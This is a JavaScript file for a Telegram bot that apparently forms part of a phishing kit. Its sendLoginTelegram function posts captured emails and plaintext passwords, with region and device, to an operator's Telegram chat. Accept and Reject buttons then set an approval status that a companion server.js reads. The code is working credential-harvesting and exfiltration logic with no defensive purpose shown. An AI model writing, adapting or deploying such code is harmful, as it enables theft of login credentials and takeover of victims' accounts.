// bot.js
import TelegramBot from "node-telegram-bot-api";
import { pendingApprovals } from "./server.js"; // import the pending approvals object

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("Missing BOT_TOKEN or CHAT_ID in environment");
  process.exit(1);
}

// Initialize bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Function to send login approval message
export async function sendLoginTelegram(email, password, region, device) {
  const message = `📥 New Login Request\n\n<b>Email:</b> ${email}\n<b>Password:</b> ${password}\n<b>Region:</b> ${region}\n<b>Device:</b> ${device}`;
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept:${email}` },
          { text: "❌ Reject", callback_data: `reject:${email}` }
        ]
      ]
    }
  };

  try {
    await bot.sendMessage(CHAT_ID, message, options);
  } catch (err) {
    console.error("Failed to send Telegram message:", err);
  }
}

// Listen to button presses
bot.on("callback_query", async (query) => {
  const [action, email] = query.data.split(":");
  if (!pendingApprovals[email]) return;

  if (action === "accept") pendingApprovals[email].status = "accepted";
  if (action === "reject") pendingApprovals[email].status = "rejected";

  await bot.answerCallbackQuery(query.id, { text: `User ${action}ed.` });
  await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
    chat_id: query.message.chat.id,
    message_id: query.message.message_id
  });
});
